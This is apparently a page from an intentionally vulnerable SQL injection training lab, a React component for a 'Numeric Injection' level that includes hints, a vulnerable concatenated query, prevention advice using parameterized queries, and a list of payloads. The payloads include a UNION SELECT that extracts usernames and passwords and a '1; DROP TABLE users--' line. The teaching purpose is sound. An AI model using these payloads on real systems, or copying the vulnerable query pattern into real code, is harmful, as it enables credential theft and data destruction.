'use client';

import LoginForm from '@/components/LoginForm';
import { LoginCredentials, ApiResponse } from '@/types';

export default function Level2() {
  const handleLogin = async (credentials: LoginCredentials): Promise<ApiResponse> => {
    try {
      const response = await fetch('/api/level2', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(credentials),
      });

      return await response.json();
    } catch (error) {
      return {
        success: false,
        error: 'Failed to connect to server'
      };
    }
  };

  const hints = [
    "This level uses numeric fields in the SQL query",
    "User ID is passed as a number without quotes",
    "Try using numeric payloads like: 1 OR 1=1",
    "No quotes are needed for numeric injection",
    "You can use UNION SELECT to extract additional data"
  ];

  return (
    <div className="min-h-screen bg-gradient-to-br from-cyber-dark via-gray-900 to-cyber-dark py-12">
      <div className="container mx-auto px-6">
        <LoginForm
          level={2}
          title="Numeric Injection"
          description="This level demonstrates SQL injection in numeric contexts where user input is treated as a number rather than a string. The application doesn't use quotes around the user input, making it vulnerable to numeric-based injection attacks."
          onSubmit={handleLogin}
          hints={hints}
          isVulnerable={true}
        />

        {/* Technical Details */}
        <div className="mt-12 max-w-4xl mx-auto">
          <div className="vulnerability-card rounded-lg p-8">
            <h2 className="text-2xl font-semibold mb-6 text-cyber-blue">
              🔍 Technical Details
            </h2>
            
            <div className="space-y-6">
              <div>
                <h3 className="text-lg font-semibold text-cyber-green mb-3">Vulnerable Code Example:</h3>
                <div className="code-block">
{`// Vulnerable numeric SQL query
const query = "SELECT * FROM users WHERE id = " + userId + " AND active = 1";

// When user inputs: 1 OR 1=1
// The query becomes:
// SELECT * FROM users WHERE id = 1 OR 1=1 AND active = 1

// More advanced payload: 1 UNION SELECT username,password,1,1,1 FROM users
// The query becomes:
// SELECT * FROM users WHERE id = 1 UNION SELECT username,password,1,1,1 FROM users AND active = 1`}
                </div>
              </div>

              <div>
                <h3 className="text-lg font-semibold text-cyber-green mb-3">Key Differences from String Injection:</h3>
                <ul className="space-y-2 text-gray-300">
                  <li className="flex items-start">
                    <span className="text-cyber-blue mr-2">•</span>
                    No quotes to escape from
                  </li>
                  <li className="flex items-start">
                    <span className="text-cyber-blue mr-2">•</span>
                    Direct numeric manipulation
                  </li>
                  <li className="flex items-start">
                    <span className="text-cyber-blue mr-2">•</span>
                    UNION attacks are often more effective
                  </li>
                  <li className="flex items-start">
                    <span className="text-cyber-blue mr-2">•</span>
                    Mathematical operations can be used
                  </li>
                </ul>
              </div>

              <div>
                <h3 className="text-lg font-semibold text-cyber-green mb-3">Common Payloads:</h3>
                <div className="code-block">
{`1 OR 1=1                    # Always true condition
1 OR 1=1--                   # With comment
1 UNION SELECT 1,2,3,4,5     # Union attack
1; DROP TABLE users--        # Destructive attack (if multiple statements enabled)
1 AND (SELECT COUNT(*) FROM information_schema.tables) > 0  # Information gathering`}
                </div>
              </div>

              <div>
                <h3 className="text-lg font-semibold text-cyber-green mb-3">Prevention:</h3>
                <div className="code-block">
{`// Use parameterized queries
const query = "SELECT * FROM users WHERE id = $1 AND active = 1";
const result = await pool.query(query, [parseInt(userId)]);

// Validate input type
if (isNaN(userId) || userId < 1) {
  throw new Error('Invalid user ID');
}`}
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
